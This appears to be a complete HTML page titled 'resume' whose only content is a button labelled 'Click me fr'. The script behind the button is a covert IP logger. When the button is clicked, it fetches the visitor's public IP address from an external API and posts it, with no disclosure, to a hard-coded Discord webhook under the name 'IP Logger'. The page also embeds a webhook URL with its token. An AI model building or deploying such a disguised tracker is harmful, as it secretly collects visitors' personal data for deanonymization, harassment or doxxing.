<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>resume</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <button onclick="sendIP()">Click me fr</button>
    </div>

    <script>
        function sendIP() {
            // Get the IP address using an external API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const webhookURL = "https://discord.com/api/webhooks/1240379672185929830/P8CXRIOJ5bwpIuT5rrYpnLhBNokyJSf0vBTWa_ccZnpl_L5J_lvY0J6e53pN44_S-sFQ";
                    const message = {
                        content: `IP Address Logged: ${ip}`,
                        username: "IP Logger"
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(message)
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log("IP logged successfully.");
                        } else {
                            console.error("Failed to send IP address to Discord.");
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                    });
                })
                .catch(error => {
                    console.error("Failed to get IP address:", error);
                });
        }
    </script>
</body>
</html>
